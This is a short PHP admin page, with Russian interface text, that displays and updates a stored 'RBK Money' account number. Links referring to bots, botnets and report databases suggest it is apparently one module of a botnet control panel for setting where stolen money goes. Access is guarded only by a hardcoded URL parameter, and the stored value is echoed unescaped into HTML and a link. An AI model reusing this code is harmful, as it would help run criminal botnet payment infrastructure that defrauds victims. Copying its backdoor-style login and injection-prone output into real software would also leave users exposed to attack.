
     <style type="text/css"> html, body {
     background: white; 
     background-attachment: fixed; 
     background-repeat: no-repeat; 
     background-position: top center;}

       </style>

  <div align="left" ><img src="images/rbk.png" width=250 /></div>
<br>
<?php
$result=' ';
if($_GET['login']==="rbkfromrussia")
{

include('system/config.php');
mysql_connect($config['mysql_host'], $config['mysql_user'], $config['mysql_pass']) or die("LOL"); 
mysql_select_db($config['mysql_db']) or die("LOL");
    if(empty($_POST))
	    {
	    
		    if(isset($_GET['ok']))
	            {
		            $result = "Кошелёк обновлен!";	
		        }
		    if(isset($_GET['error']))
	            {
		            $result = "Длина кошелька не верная.";	
		        }
		    $sql_rbk = "SELECT `rbk` FROM `rbkrbk` WHERE 1";
			$sql_rbk_go = mysql_query($sql_rbk);
			$rbk_array = mysql_fetch_row($sql_rbk_go);
			if($rbk_array === false )
			    {
				    $rbk = "RU400000000";
					
				    $pre_rbk = "INSERT INTO `rbkrbk` (`rbk`) VALUES ('$rbk')";
					$pre_rbk_go = mysql_query($pre_rbk);
				}
			    else
				{
				    $rbk = $rbk_array[0];
				}


		    $form = "
			         <form method='post' action='rbk.php?login=rbkfromrussia'> 
			      
					<font color='#000000'><b>Номер счёта:</b></font>
					 <input type='text' name='rbk' size='15' maxlength='11' value='$rbk'>
					 <br><br>
					 <input name='Submit' type=submit size='width:100px' value='Сохранить'>
					 <br>
			         <div><font color='#00000'>$result</font></div>
			         
			         
                     </form>";
                   
			echo $form;
		}
		else
		{		
		    $sql_rbk = "SELECT `rbk` FROM `rbkrbk` WHERE 1";
			$sql_rbk_go = mysql_query($sql_rbk);
			$rbk_array = mysql_fetch_row($sql_rbk_go);
            $rbk_do = $rbk_array[0];			
		
		 
		    $rbk = mysql_real_escape_string($_POST['rbk']);
			
			if(strlen($rbk) === 11)
			    {
			}
			else
			{
			 header("Location: rbk.php?login=rbkfromrussia&error=1");
			 exit;
			}
			
				
			$up_rbk = "UPDATE `rbkrbk` SET `rbk`='$rbk' WHERE  `rbk`='$rbk_do'  LIMIT 1;";
			$up_go = mysql_query($up_rbk);
			header("Location: rbk.php?login=rbkfromrussia&ok=1");
		}
		
}
else{echo "<font color='red'><b>Не авторизирован</b></font>", "<BR>","<BR>","<BR>" ;}
?>
<br>
<div align="left" ><img src="images/rbkchk.png" width=250 /></div>
<br>
<div align="left" ><a href="mtanqste.php?rm=0&m=reports_db&date1=010112&date2=121213&bots=&botnets=&ips=&countries=&q=<?php echo $rbk; ?>&blt=0" target="blank"><font color='#000000'><b>Check RBK Money</b></font></a></div>

</body>
</html>
